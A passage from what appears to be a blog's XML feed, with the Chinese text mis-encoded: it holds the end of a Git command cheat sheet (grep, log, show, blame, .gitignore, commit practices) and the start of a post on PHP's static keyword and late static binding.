title="æˆ‘æƒ³åœ¨é¡¹ç›®ä¸­æŸ¥æ‰¾æŸä¸ªå…³é”®è¯ï¼Œå¹¶è¾“å‡ºæ‰€åœ¨è¡Œå·"></a>æˆ‘æƒ³åœ¨é¡¹ç›®ä¸­æŸ¥æ‰¾æŸä¸ªå…³é”®è¯ï¼Œå¹¶è¾“å‡ºæ‰€åœ¨è¡Œå·</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git grep <span class="string">[-n]</span> <span class="string">[keyword]</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æŸ¥çœ‹æœç´¢ç»“æœæ‰€å±æ–¹æ³•æˆ–å‡½æ•°"><a href="#æˆ‘æƒ³æŸ¥çœ‹æœç´¢ç»“æœæ‰€å±æ–¹æ³•æˆ–å‡½æ•°" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æœç´¢ç»“æœæ‰€å±æ–¹æ³•æˆ–å‡½æ•°"></a>æˆ‘æƒ³æŸ¥çœ‹æœç´¢ç»“æœæ‰€å±æ–¹æ³•æˆ–å‡½æ•°</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git grep -<span class="selector-tag">p</span> [keyword]</span><br></pre></td></tr></table></figure><h2 id="æ—¥å¿—"><a href="#æ—¥å¿—" class="headerlink" title="æ—¥å¿—"></a>æ—¥å¿—</h2><p><code>git log</code>ä¸­æœ‰å¾ˆå¤šå‚æ•°èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬å¢å¼ºç­›é€‰ï¼Œå¸¸ç”¨çš„é€‰é¡¹å¦‚ä¸‹è¡¨</p><table><thead><tr><th>é€‰é¡¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>-p</code></td><td>æŒ‰è¡¥ä¸æ ¼å¼æ˜¾ç¤ºæ¯ä¸ªæ›´æ–°ä¹‹é—´çš„å·®å¼‚ã€‚</td></tr><tr><td><code>--stat</code></td><td>æ˜¾ç¤ºæ¯æ¬¡æ›´æ–°çš„æ–‡ä»¶ä¿®æ”¹ç»Ÿè®¡ä¿¡æ¯ã€‚</td></tr><tr><td><code>--shortstat</code></td><td>åªæ˜¾ç¤º â€“stat ä¸­æœ€åçš„è¡Œæ•°ä¿®æ”¹æ·»åŠ ç§»é™¤ç»Ÿè®¡ã€‚</td></tr><tr><td><code>--name-only</code></td><td>ä»…åœ¨æäº¤ä¿¡æ¯åæ˜¾ç¤ºå·²ä¿®æ”¹çš„æ–‡ä»¶æ¸…å•ã€‚</td></tr><tr><td><code>--name-status</code></td><td>æ˜¾ç¤ºæ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤çš„æ–‡ä»¶æ¸…å•ã€‚</td></tr><tr><td><code>--abbrev-commit</code></td><td>ä»…æ˜¾ç¤º SHA-1 çš„å‰å‡ ä¸ªå­—ç¬¦ï¼Œè€Œéæ‰€æœ‰çš„ 40 ä¸ªå­—ç¬¦ã€‚</td></tr><tr><td><code>--relative-date</code></td><td>ä½¿ç”¨è¾ƒçŸ­çš„ç›¸å¯¹æ—¶é—´æ˜¾ç¤ºï¼ˆæ¯”å¦‚ï¼Œâ€œ2 weeks agoâ€ï¼‰ã€‚</td></tr><tr><td><code>--graph</code></td><td>æ˜¾ç¤º ASCII å›¾å½¢è¡¨ç¤ºçš„åˆ†æ”¯åˆå¹¶å†å²ã€‚</td></tr><tr><td><code>--pretty</code></td><td>ä½¿ç”¨å…¶ä»–æ ¼å¼æ˜¾ç¤ºå†å²æäº¤ä¿¡æ¯ã€‚å¯ç”¨çš„é€‰é¡¹åŒ…æ‹¬ onelineï¼Œshortï¼Œfullï¼Œfuller å’Œ formatï¼ˆåè·ŸæŒ‡å®šæ ¼å¼ï¼‰ã€‚</td></tr></tbody></table><p><code>git log --pretty=format</code> å¸¸ç”¨çš„é€‰é¡¹å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>é€‰é¡¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>%H</code></td><td>æäº¤å¯¹è±¡ï¼ˆcommitï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸²</td></tr><tr><td><code>%h</code></td><td>æäº¤å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸²</td></tr><tr><td><code>%T</code></td><td>æ ‘å¯¹è±¡ï¼ˆtreeï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸²</td></tr><tr><td><code>%t</code></td><td>æ ‘å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸²</td></tr><tr><td><code>%P</code></td><td>çˆ¶å¯¹è±¡ï¼ˆparentï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸²</td></tr><tr><td><code>%p</code></td><td>çˆ¶å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸²</td></tr><tr><td><code>%an</code></td><td>ä½œè€…ï¼ˆauthorï¼‰çš„åå­—</td></tr><tr><td><code>%ae</code></td><td>ä½œè€…çš„ç”µå­é‚®ä»¶åœ°å€</td></tr><tr><td><code>%ad</code></td><td>ä½œè€…ä¿®è®¢æ—¥æœŸï¼ˆå¯ä»¥ç”¨ â€“date= é€‰é¡¹å®šåˆ¶æ ¼å¼ï¼‰</td></tr><tr><td><code>%ar</code></td><td>ä½œè€…ä¿®è®¢æ—¥æœŸï¼ŒæŒ‰å¤šä¹…ä»¥å‰çš„æ–¹å¼æ˜¾ç¤º</td></tr><tr><td><code>%cn</code></td><td>æäº¤è€…ï¼ˆcommitterï¼‰çš„åå­—</td></tr><tr><td><code>%ce</code></td><td>æäº¤è€…çš„ç”µå­é‚®ä»¶åœ°å€</td></tr><tr><td><code>%cd</code></td><td>æäº¤æ—¥æœŸ</td></tr><tr><td><code>%cr</code></td><td>æäº¤æ—¥æœŸï¼ŒæŒ‰å¤šä¹…ä»¥å‰çš„æ–¹å¼æ˜¾ç¤º</td></tr><tr><td><code>%s</code></td><td>æäº¤è¯´æ˜</td></tr></tbody></table><p>é™åˆ¶ <code>git log</code> è¾“å‡ºçš„é€‰é¡¹</p><table><thead><tr><th>é€‰é¡¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>-(n)</code></td><td>ä»…æ˜¾ç¤ºæœ€è¿‘çš„ n æ¡æäº¤</td></tr><tr><td><code>--since, --after</code></td><td>ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´ä¹‹åçš„æäº¤ã€‚</td></tr><tr><td><code>--until, --before</code></td><td>ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´ä¹‹å‰çš„æäº¤ã€‚</td></tr><tr><td><code>--author</code></td><td>ä»…æ˜¾ç¤ºæŒ‡å®šä½œè€…ç›¸å…³çš„æäº¤ã€‚</td></tr><tr><td><code>--committer</code></td><td>ä»…æ˜¾ç¤ºæŒ‡å®šæäº¤è€…ç›¸å…³çš„æäº¤ã€‚</td></tr><tr><td><code>--grep</code></td><td>ä»…æ˜¾ç¤ºå«æŒ‡å®šå…³é”®å­—çš„æäº¤</td></tr><tr><td><code>-S</code></td><td>ä»…æ˜¾ç¤ºæ·»åŠ æˆ–ç§»é™¤äº†æŸä¸ªå…³é”®å­—çš„æäº¤</td></tr></tbody></table><h3 id="æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿¡æ¯"><a href="#æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿¡æ¯" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿¡æ¯"></a>æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿¡æ¯</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">show</span> [<span class="keyword">commit</span>-<span class="keyword">id</span>]</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿®æ”¹çš„æ–‡ä»¶åˆ—è¡¨"><a href="#æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿®æ”¹çš„æ–‡ä»¶åˆ—è¡¨" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿®æ”¹çš„æ–‡ä»¶åˆ—è¡¨"></a>æˆ‘æƒ³æŸ¥çœ‹æŸæ¬¡æäº¤ä¿®æ”¹çš„æ–‡ä»¶åˆ—è¡¨</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git show <span class="params">--pretty=</span><span class="string">""</span> <span class="params">--name-only</span> [commit-id]</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹æŸæ¬¡æäº¤çš„å˜æ›´å†…å®¹"><a href="#æŸ¥çœ‹æŸæ¬¡æäº¤çš„å˜æ›´å†…å®¹" class="headerlink" title="æŸ¥çœ‹æŸæ¬¡æäº¤çš„å˜æ›´å†…å®¹"></a>æŸ¥çœ‹æŸæ¬¡æäº¤çš„å˜æ›´å†…å®¹</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">show</span> <span class="comment">--pretty="" [commit-id]</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰æäº¤ä¿¡æ¯"><a href="#æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰æäº¤ä¿¡æ¯" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰æäº¤ä¿¡æ¯"></a>æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰æäº¤ä¿¡æ¯</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git <span class="built-in">log</span> -p [filename]</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æŸ¥çœ‹æœ€è¿‘ä¸¤æ¬¡çš„æäº¤ä¿¡æ¯"><a href="#æˆ‘æƒ³æŸ¥çœ‹æœ€è¿‘ä¸¤æ¬¡çš„æäº¤ä¿¡æ¯" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æœ€è¿‘ä¸¤æ¬¡çš„æäº¤ä¿¡æ¯"></a>æˆ‘æƒ³æŸ¥çœ‹æœ€è¿‘ä¸¤æ¬¡çš„æäº¤ä¿¡æ¯</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git <span class="built-in">log</span> -p <span class="number">-2</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰å˜åŠ¨åŠç»Ÿè®¡ä¿¡æ¯"><a href="#æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰å˜åŠ¨åŠç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰å˜åŠ¨åŠç»Ÿè®¡ä¿¡æ¯"></a>æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰å˜åŠ¨åŠç»Ÿè®¡ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git whatchanged --<span class="built_in">stat</span> [filename]</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³ä¿®æ”¹æœ€è¿‘ä¸€æ¬¡æäº¤ä¿¡æ¯"><a href="#æˆ‘æƒ³ä¿®æ”¹æœ€è¿‘ä¸€æ¬¡æäº¤ä¿¡æ¯" class="headerlink" title="æˆ‘æƒ³ä¿®æ”¹æœ€è¿‘ä¸€æ¬¡æäº¤ä¿¡æ¯"></a>æˆ‘æƒ³ä¿®æ”¹æœ€è¿‘ä¸€æ¬¡æäº¤ä¿¡æ¯</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">commit</span> <span class="comment">--amend</span></span><br></pre></td></tr></table></figure><h3 id="æŸè¡Œä»£ç æœ‰é—®é¢˜ï¼Œæˆ‘æƒ³æŸ¥çœ‹è°æœ€åä¿®æ”¹äº†è¿™é‡Œ"><a href="#æŸè¡Œä»£ç æœ‰é—®é¢˜ï¼Œæˆ‘æƒ³æŸ¥çœ‹è°æœ€åä¿®æ”¹äº†è¿™é‡Œ" class="headerlink" title="æŸè¡Œä»£ç æœ‰é—®é¢˜ï¼Œæˆ‘æƒ³æŸ¥çœ‹è°æœ€åä¿®æ”¹äº†è¿™é‡Œ"></a>æŸè¡Œä»£ç æœ‰é—®é¢˜ï¼Œæˆ‘æƒ³æŸ¥çœ‹è°æœ€åä¿®æ”¹äº†è¿™é‡Œ</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git blame [-L <span class="built_in">start</span>-<span class="built_in">line</span>, <span class="keyword">end</span>-<span class="built_in">line</span>] filename</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªç”¨æˆ·åœ¨æŸä¸ªæ—¶é—´æ®µå†…çš„æ‰€æœ‰æäº¤ï¼Œå¹¶ä»…è¾“å‡ºç®€çŸ­hashä¸æäº¤è¯´æ˜"><a href="#æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªç”¨æˆ·åœ¨æŸä¸ªæ—¶é—´æ®µå†…çš„æ‰€æœ‰æäº¤ï¼Œå¹¶ä»…è¾“å‡ºç®€çŸ­hashä¸æäº¤è¯´æ˜" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªç”¨æˆ·åœ¨æŸä¸ªæ—¶é—´æ®µå†…çš„æ‰€æœ‰æäº¤ï¼Œå¹¶ä»…è¾“å‡ºç®€çŸ­hashä¸æäº¤è¯´æ˜"></a>æˆ‘æƒ³æŸ¥çœ‹æŸä¸ªç”¨æˆ·åœ¨æŸä¸ªæ—¶é—´æ®µå†…çš„æ‰€æœ‰æäº¤ï¼Œå¹¶ä»…è¾“å‡ºç®€çŸ­hashä¸æäº¤è¯´æ˜</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log <span class="attribute">--pretty</span>=<span class="string">"%h - %s"</span> <span class="attribute">--author</span>=Rock <span class="attribute">--since</span>=<span class="string">"2008-10-01"</span> <span class="attribute">--before</span>=<span class="string">"2008-11-01"</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³ç”¨å›¾å½¢çš„æ–¹å¼æŸ¥çœ‹åˆ†æ”¯çš„å˜åŒ–"><a href="#æˆ‘æƒ³ç”¨å›¾å½¢çš„æ–¹å¼æŸ¥çœ‹åˆ†æ”¯çš„å˜åŒ–" class="headerlink" title="æˆ‘æƒ³ç”¨å›¾å½¢çš„æ–¹å¼æŸ¥çœ‹åˆ†æ”¯çš„å˜åŒ–"></a>æˆ‘æƒ³ç”¨å›¾å½¢çš„æ–¹å¼æŸ¥çœ‹åˆ†æ”¯çš„å˜åŒ–</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> <span class="comment">--oneline --graph</span></span><br></pre></td></tr></table></figure><h2 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h2><ul><li><code>**/*.go</code> å¿½ç•¥æ‰€æœ‰ç›®å½•ä¸­çš„æ‰©å±•åä¸ºgoçš„æ–‡ä»¶</li><li><code>*/*/temp*</code>å¿½ç•¥äºŒçº§ç›®å½•ä¸‹ä»¥tempå¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶</li><li><code>temp?</code>å¿½ç•¥ä»¥tempå¼€å¤´çš„æ–‡ä»¶åï¼Œå¦‚<code>tempa</code>å’Œ<code>tempb</code></li><li><code>!README.md</code>æ„Ÿå¹å·(<code>!</code>)è¡¨ç¤ºä¸å¿½ç•¥è¯¥æ–‡ä»¶</li></ul><h2 id="ç‰ˆæœ¬æ§åˆ¶æœ€ä½³å®è·µ"><a href="#ç‰ˆæœ¬æ§åˆ¶æœ€ä½³å®è·µ" class="headerlink" title="ç‰ˆæœ¬æ§åˆ¶æœ€ä½³å®è·µ"></a>ç‰ˆæœ¬æ§åˆ¶æœ€ä½³å®è·µ</h2><h3 id="é¼“åŠ±é¢‘ç¹æäº¤"><a href="#é¼“åŠ±é¢‘ç¹æäº¤" class="headerlink" title="é¼“åŠ±é¢‘ç¹æäº¤"></a>é¼“åŠ±é¢‘ç¹æäº¤</h3><p>é¢‘ç¹æäº¤ï¼Œè€Œä¸è¦ç­‰åˆ°ä»£ç æ²¡æœ‰é—®é¢˜äº†å†ä¸€æ¬¡æ€§æäº¤ã€‚å¯¹äºå¯èƒ½æŸåä¸»å¹²åŸåˆ™çš„ä»£ç ï¼Œä¸è¦ç›´æ¥æäº¤åˆ°ä¸»å¹²ï¼Œè€Œæ˜¯åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œåœ¨åˆ†æ”¯ä¸­é¢‘ç¹æäº¤ã€‚</p><h3 id="å®šä¹‰ä¸»å¹²åŸåˆ™ï¼Œå¹¶ä¸”åšå®ˆå®ƒ"><a href="#å®šä¹‰ä¸»å¹²åŸåˆ™ï¼Œå¹¶ä¸”åšå®ˆå®ƒ" class="headerlink" title="å®šä¹‰ä¸»å¹²åŸåˆ™ï¼Œå¹¶ä¸”åšå®ˆå®ƒ"></a>å®šä¹‰ä¸»å¹²åŸåˆ™ï¼Œå¹¶ä¸”åšå®ˆå®ƒ</h3><p>â€œä¸»å¹²çš„ä»£ç å¿…é¡»æ˜¯å¯ä»¥å‘å¸ƒå¹¶ä¸”ä¸ä¼šäº§ç”Ÿbugçš„â€ï¼Œå¦‚æœä¸èƒ½ä¿è¯æ–°å¢æˆ–ä¿®æ”¹çš„ä»£ç ç¬¦åˆè¿™ä¸€åŸåˆ™ï¼Œå°±åœ¨åˆ†æ”¯æäº¤ä»£ç ã€‚</p><h3 id="ä¸è¦æŠŠé€»è¾‘çš„ä¿®æ”¹å’Œä»£ç æ ¼å¼åŒ–æ“ä½œæ··åœ¨ä¸€èµ·"><a href="#ä¸è¦æŠŠé€»è¾‘çš„ä¿®æ”¹å’Œä»£ç æ ¼å¼åŒ–æ“ä½œæ··åœ¨ä¸€èµ·" class="headerlink" title="ä¸è¦æŠŠé€»è¾‘çš„ä¿®æ”¹å’Œä»£ç æ ¼å¼åŒ–æ“ä½œæ··åœ¨ä¸€èµ·"></a>ä¸è¦æŠŠé€»è¾‘çš„ä¿®æ”¹å’Œä»£ç æ ¼å¼åŒ–æ“ä½œæ··åœ¨ä¸€èµ·</h3><p>å¦‚æœä½ åšäº†ä¸€äº›ä»£ç æ ¼å¼åŒ–çš„æ“ä½œï¼Œå°±å•ç‹¬æäº¤è¿™æ¬¡ä¿®æ”¹ï¼Œç„¶åå†åšä¸€äº›é€»è¾‘çš„ä¿®æ”¹åæäº¤ï¼Œè¿™æ ·å¯ä»¥åœ¨å‡ºç°é—®é¢˜æ—¶å®¹æ˜“è¿½æº¯ã€‚</p><h3 id="ä¸ç›¸å¹²çš„ä»£ç åˆ†å¼€æäº¤"><a href="#ä¸ç›¸å¹²çš„ä»£ç åˆ†å¼€æäº¤" class="headerlink" title="ä¸ç›¸å¹²çš„ä»£ç åˆ†å¼€æäº¤"></a>ä¸ç›¸å¹²çš„ä»£ç åˆ†å¼€æäº¤</h3><p>ä¹Ÿå°±æ˜¯è¯´ä¸è¦åœ¨ä¸€æ¬¡æäº¤é‡Œä¿®å¤ä¸¤ä¸ªbug</p><hr><h1 id="ç›¸å…³é˜…è¯»"><a href="#ç›¸å…³é˜…è¯»" class="headerlink" title="ç›¸å…³é˜…è¯»"></a>ç›¸å…³é˜…è¯»</h1><ol><li><a href="https://blog.shixinyu.space/post/git-notes/">Git å¸¸ç”¨å‘½ä»¤æ€»ç»“</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆPHPä¸­çš„staticå…³é”®å­—</title>
      <link href="/post/php-static/"/>
      <url>/post/php-static/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm4yvhsgj30ci05kt99.jpg" alt=""></p><a id="more"></a><h2 id="static-çš„å‡ ç§ä½¿ç”¨æƒ…å†µï¼š"><a href="#static-çš„å‡ ç§ä½¿ç”¨æƒ…å†µï¼š" class="headerlink" title="static çš„å‡ ç§ä½¿ç”¨æƒ…å†µï¼š"></a>static çš„å‡ ç§ä½¿ç”¨æƒ…å†µï¼š</h2><h3 id="1-é™æ€å˜é‡"><a href="#1-é™æ€å˜é‡" class="headerlink" title="1. é™æ€å˜é‡"></a>1. é™æ€å˜é‡</h3><p>é™æ€å˜é‡ä»…åœ¨å±€éƒ¨å‡½æ•°åŸŸä¸­å­˜åœ¨ï¼Œä½†å½“ç¨‹åºæ‰§è¡Œç¦»å¼€æ­¤ä½œç”¨åŸŸæ—¶ï¼Œå…¶å€¼å¹¶ä¸ä¸¢å¤±ã€‚çœ‹çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testStatic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $val = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> $val;</span><br><span class="line">    $val++;</span><br><span class="line">&#125;</span><br><span class="line">testStatic();   <span class="comment">//output 1</span></span><br><span class="line">testStatic();   <span class="comment">//output 2</span></span><br><span class="line">testStatic();   <span class="comment">//output 3</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å£°æ˜<code>static</code>ï¼Œåˆ™æ¯æ¬¡<code>$val</code>çš„å€¼éƒ½ä¼šåˆå§‹åŒ–ä¸º1ã€‚è¿™æ˜¯ç”±äº<code>static</code>å…³é”®å­—ä¼šåœ¨è¯·æ±‚åˆå§‹åŒ–æ—¶å­˜å‚¨ä¸é™æ€å­˜å‚¨åŒºï¼Œå¹¶å­˜åœ¨äºæ•´ä¸ªè¯·æ±‚ç”Ÿå‘½å‘¨æœŸå†…ï¼Œè€Œæ™®é€šå˜é‡åˆ™å­˜åœ¨äºæ ˆåŒºï¼Œå‡½æ•°æ‰§è¡Œç»“æŸæ—¶è¿™äº›å­˜å‚¨å•å…ƒè‡ªåŠ¨è¢«é‡Šæ”¾ã€‚</p><h3 id="2-é™æ€å±æ€§"><a href="#2-é™æ€å±æ€§" class="headerlink" title="2. é™æ€å±æ€§"></a>2. é™æ€å±æ€§</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">roster</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-é™æ€æ–¹æ³•"><a href="#3-é™æ€æ–¹æ³•" class="headerlink" title="3. é™æ€æ–¹æ³•"></a>3. é™æ€æ–¹æ³•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">roster</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-åæœŸé™æ€ç»‘å®š"><a href="#4-åæœŸé™æ€ç»‘å®š" class="headerlink" title="4. åæœŸé™æ€ç»‘å®š"></a>4. åæœŸé™æ€ç»‘å®š</h3><p>é¦–å…ˆï¼ŒåæœŸé™æ€ç»‘å®šè¿™ä¸ªè¯æ€ä¹ˆç†è§£ï¼Œå®˜æ–¹æ‰‹å†Œå¯¹è¿™ä¸ªè§£é‡Šçš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œå¼•ç”¨ä¸€ä¸‹ï¼šã€â€œåæœŸç»‘å®šâ€çš„æ„æ€æ˜¯è¯´ï¼Œ<code>static::</code> ä¸å†è¢«è§£æä¸ºå®šä¹‰å½“å‰æ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œè€Œæ˜¯åœ¨å®é™…è¿è¡Œæ—¶è®¡ç®—çš„ã€‚ä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºâ€œé™æ€ç»‘å®šâ€ï¼Œå› ä¸ºå®ƒå¯ä»¥ç”¨äºï¼ˆä½†<strong>ä¸é™äº</strong>ï¼‰é™æ€æ–¹æ³•çš„è°ƒç”¨ã€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œstatic çš„å€¼åªæœ‰åœ¨è°ƒç”¨æ—¶æ‰èƒ½ç¡®å®šä¸‹æ¥ï¼Œè€Œ self åˆ™æ˜¯åœ¨å®šä¹‰æ—¶å°±ç¡®å®šä¸‹æ¥çš„ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬ç”¨å‡ ä¸ªä¾‹å­æ¥å…·ä½“è¯´æ˜ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who(); <span class="comment">// åæœŸé™æ€ç»‘å®šä»è¿™é‡Œå¼€å§‹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B::test();</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„æœ€ç»ˆè¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ<code>A</code>è¿˜æ˜¯<code>B</code>ï¼Ÿ</p><p>è®©æˆ‘ä»¬æ¥è¿è¡Œä¸€ä¸‹ï¼Œå‘ç°ç»“æœæ˜¯<code>B</code>ã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>å› ä¸ºå½“æˆ‘ä»¬è°ƒç”¨<code>B</code>ä¸­çš„é™æ€æ–¹æ³•<code>test()</code>æ—¶ï¼ŒB ä¸­ä¸å­˜åœ¨ï¼Œäºæ˜¯å‘ä¸ŠæŸ¥æ‰¾ï¼ˆè°ƒç”¨æŸ¥æ‰¾é¡ºåºä¾æ¬¡ä¸º å½“å‰ç±» ==&gt; trait ==&gt; 